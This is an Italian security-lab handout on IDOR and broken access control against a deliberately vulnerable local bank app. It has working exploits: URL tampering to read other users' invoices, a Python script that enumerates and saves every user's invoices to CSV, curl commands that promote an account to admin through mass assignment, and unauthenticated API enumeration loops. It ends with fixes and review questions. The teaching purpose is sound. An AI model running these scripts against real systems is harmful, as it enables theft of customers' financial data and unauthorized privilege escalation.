# Laboratorio Capitolo 6 — IDOR e Broken Access Control

> **Prerequisito:** Capitolo 6 della dispensa, Lab 05 completato.
> **Tempo:** 90-120 minuti.
> **Obiettivo:** sfruttare 4 vulnerabilità di controllo accesso, automatizzare l'esfiltrazione del database, correggere.

---

## Setup

Come per il Lab 05: lancia `python app.py` in `BancaPiccola-vuln/`, apri <http://127.0.0.1:5000>.

**Importante:** prima di iniziare, **rilancia la SQLi del Lab 05 se l'hai già corretta**: le vulnerabilità sono indipendenti, ma per realismo è utile lavorare su una versione ancora interamente vulnerabile. Oppure copia `BancaPiccola-vuln/app.py` in un file `app-original.py` prima di toccarlo, e lavora su una copia.

---

## Attacco 1 — Lettura di fatture altrui (IDOR classico)

### Obiettivo

Come utente `mario`, leggere fatture che appartengono a `giulia` o `luca`.

### Istruzioni

1. Fai login come **mario** / **mario123**
2. Dalla dashboard, vedi le tue fatture (id 1, 2, 3)
3. Modifica manualmente l'URL da `/fattura/1` a:

   ```
   http://127.0.0.1:5000/fattura/5
   ```

4. Vedi la fattura di **Giulia** "Bolletta gas Edison 134.50€"

### Variante

Prova `/fattura/6`, `/fattura/7`: vedi il mutuo di Giulia e il suo acquisto Amazon. `/fattura/8` e `/fattura/9`: le fatture di Luca.

---

## Attacco 2 — Esfiltrazione automatica dell'intero database fatture

### Obiettivo

Scrivere uno script Python che, autenticato come un singolo utente banale (Mario), esfiltri **tutte** le fatture di tutti gli utenti del database.

### Script

Crea un file `esfiltratore.py` **fuori** dalla cartella di `BancaPiccola-vuln` (per non confonderlo con il codice dell'app):

```python
import requests
import re
import csv

BASE = "http://127.0.0.1:5000"
sessione = requests.Session()

# Login come Mario
r = sessione.post(f"{BASE}/login", data={"username": "mario", "password": "mario123"})
if "Dashboard" not in r.text and r.status_code != 200:
    print("Login fallito"); exit(1)

print("Login OK come mario. Inizio esfiltrazione...\n")

righe_csv = []
for fattura_id in range(1, 1001):
    r = sessione.get(f"{BASE}/fattura/{fattura_id}")
    if r.status_code != 200:
        continue

    # Regex per estrarre i campi dalla pagina HTML
    intestatario = re.search(r"Intestatario:</b>\s*([^(]+)\(([^)]+)\)", r.text)
    data         = re.search(r"Data:</b>\s*(\S+)", r.text)
    descrizione  = re.search(r"Descrizione:</b>\s*([^<]+)", r.text)
    importo      = re.search(r"Importo:</b>.*?([-+]?\d+\.\d+)", r.text, re.DOTALL)

    if intestatario and importo:
        nome = intestatario.group(1).strip()
        username = intestatario.group(2).strip()
        imp = float(importo.group(1))
        desc = (descrizione.group(1).strip() if descrizione else "?")
        dt = (data.group(1) if data else "?")
        righe_csv.append([fattura_id, username, nome, dt, imp, desc])
        print(f"Fattura {fattura_id:>3} — {username:<10} "
              f"{nome:<25} {imp:>10.2f} €  ({desc[:40]})")

# Salva su CSV
with open("/tmp/fatture-esfiltrate.csv", "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f)
    w.writerow(["id", "username", "nome", "data", "importo", "descrizione"])
    w.writerows(righe_csv)
print(f"\n{len(righe_csv)} fatture esfiltrate in /tmp/fatture-esfiltrate.csv")

# Statistiche per utente
from collections import defaultdict
per_utente = defaultdict(float)
for r in righe_csv:
    per_utente[r[1]] += r[4]
print("\nSaldo netto per utente (dal totale delle fatture):")
for u, s in sorted(per_utente.items(), key=lambda x: -x[1]):
    print(f"  {u:<10} {s:>10.2f} €")
```

Esegui (in un terminale diverso da quello di Flask):

```bash
pip install requests
python esfiltratore.py
```

### Output atteso

```
Login OK come mario. Inizio esfiltrazione...

Fattura   1 — mario      Mario Rossi              3200.00 €  (Bonifico stipendio...)
Fattura   2 — mario      Mario Rossi               -15.99 €  (Pagamento abbonament...)
Fattura   3 — mario      Mario Rossi               -78.40 €  (Bolletta Enel Energi...)
Fattura   4 — giulia     Giulia Bianchi           2150.00 €  (Bonifico stipendio...)
Fattura   5 — giulia     Giulia Bianchi           -134.50 €  (Bolletta gas Edison)
...
Fattura   9 — luca       Luca Verdi               -512.00 €  (Pagamento RC Auto...)

9 fatture esfiltrate in /tmp/fatture-esfiltrate.csv

Saldo netto per utente:
  mario        3105.61 €
  giulia        990.20 €
  luca          468.00 €
```

**Hai appena esfiltrato l'intero database delle transazioni della banca** partendo da un account cliente qualunque. In 15 righe di Python, 5 secondi di esecuzione.

---

## Attacco 3 — Mass Assignment: promuoversi ad admin

### Obiettivo

L'endpoint `/profilo` accetta qualsiasi campo dal form, incluso il campo `ruolo`. Modificando il proprio profilo, promuoversi ad amministratore.

### Istruzioni

Loggato come **mario**, apri DevTools del browser (F12), vai sulla tab **Network**, poi sulla pagina <http://127.0.0.1:5000/profilo>.

Puoi procedere con curl (più pulito):

```bash
# Login come Mario
curl -c /tmp/cookie.txt -X POST \
     -d "username=mario&password=mario123" \
     http://127.0.0.1:5000/login

# Aggiorna il profilo includendo il campo 'ruolo'
curl -b /tmp/cookie.txt -X POST \
     -d "nome=Mario&cognome=Rossi&email=mario@rossi.it&ruolo=admin" \
     http://127.0.0.1:5000/profilo

# Verifica: vai sulla home, ora il link "Admin" è visibile
curl -b /tmp/cookie.txt http://127.0.0.1:5000/dashboard | grep -i admin
```

### Verifica

Nel browser (stessa sessione), **ricarica la pagina**. Ora il menu mostra il link "Admin": clicca e accedi al pannello amministrativo. Vedi la lista completa degli utenti con email.

> 🚨 **Conseguenza reale:** in una banca vera, un cliente che si è promosso admin può: vedere i dati di tutti i correntisti, eseguire operazioni a nome di altri, cancellare dati, esfiltrare l'anagrafica completa.

---

## Attacco 4 — API senza autenticazione (BOLA)

### Obiettivo

Recuperare dati di altri utenti tramite l'API, **senza fare login**.

### Istruzioni

Apri un browser in incognito (niente sessione attiva) e vai su:

```
http://127.0.0.1:5000/api/utenti/1
http://127.0.0.1:5000/api/utenti/2
http://127.0.0.1:5000/api/utenti/3
http://127.0.0.1:5000/api/utenti/4
```

O da terminale:

```bash
for i in 1 2 3 4 5; do
  echo "--- utente $i ---"
  curl -s http://127.0.0.1:5000/api/utenti/$i
  echo
done
```

Ottieni i dati completi di tutti gli utenti in JSON. **Niente login, niente cookie, niente autorizzazione.**

Lo stesso vale per `/api/fatture/<id>`:

```bash
for i in 1 2 3 4 5 6 7 8 9; do
  curl -s http://127.0.0.1:5000/api/fatture/$i
  echo
done
```

---

## Correzione

### Apri `app.py` e cerca

**Punto 1 — endpoint `fattura()`:** aggiungi il controllo di proprietà nella query:

```python
# Versione sicura
cur.execute("""
    SELECT f.id, f.numero, f.data, f.descrizione, f.importo, f.allegato,
           u.username, u.nome, u.cognome
    FROM fatture f JOIN utenti u ON f.utente_id = u.id
    WHERE f.id = ? AND f.utente_id = ?
""", (fattura_id, session["utente_id"]))
```

(Eccezione opzionale per l'admin: se `session["ruolo"] == "admin"`, usa la query senza il filtro utente.)

**Punto 2 — endpoint `profilo()`:** sostituisci il `to_dict()` aperto con una **whitelist** dei campi ammessi:

```python
campi_ammessi = {"nome", "cognome", "email"}          # ruolo NON incluso
aggiornamenti = {}
for campo in campi_ammessi:
    valore = request.form.get(campo, "").strip()
    if valore:
        aggiornamenti[campo] = valore

if aggiornamenti:
    set_clause = ", ".join(f"{campo} = ?" for campo in aggiornamenti.keys())
    valori = list(aggiornamenti.values()) + [session["utente_id"]]
    cur.execute(f"UPDATE utenti SET {set_clause} WHERE id = ?", valori)
    conn.commit()
```

Rimuovi anche il parametro `utente_id` dalla signature: l'utente può modificare solo il proprio profilo.

**Punto 3 — endpoint API:** aggiungi autenticazione + ownership:

```python
@app.route("/api/utenti/<int:utente_id>")
def api_utente(utente_id):
    if "utente_id" not in session:
        return jsonify({"errore": "autenticazione richiesta"}), 401
    if session.get("ruolo") != "admin" and session["utente_id"] != utente_id:
        return jsonify({"errore": "accesso negato"}), 403
    # ... resto identico
```

E analogamente per `api_fattura()`, aggiungendo `AND f.utente_id = ?` nella query per i non-admin.

### Verifica

Rilancia l'app. Rifai tutti e 4 gli attacchi:

1. `/fattura/5` come Mario → **404 Fattura non trovata**
2. Script `esfiltratore.py` → scarica solo le 3 fatture di Mario
3. POST `/profilo` con `ruolo=admin` → ruolo rimane `cliente` (campo ignorato)
4. GET `/api/utenti/3` senza login → 401; con login come Mario → 403

**Hai chiuso tutte le IDOR.**

---

## Domande di riflessione

1. Qual è la differenza concettuale fra autenticazione e autorizzazione? Fai un esempio non-tecnico.
2. Perché restituire 404 invece di 403 a una risorsa esistente ma non autorizzata?
3. Nel Mass Assignment, perché usare una whitelist e non una blacklist ("tutti i campi tranne `ruolo`")?
4. Supponi di avere un'applicazione con 200 endpoint. Come ti organizzi per garantire che il controllo di proprietà sia applicato **ovunque** e non dimenticato in nessun posto?
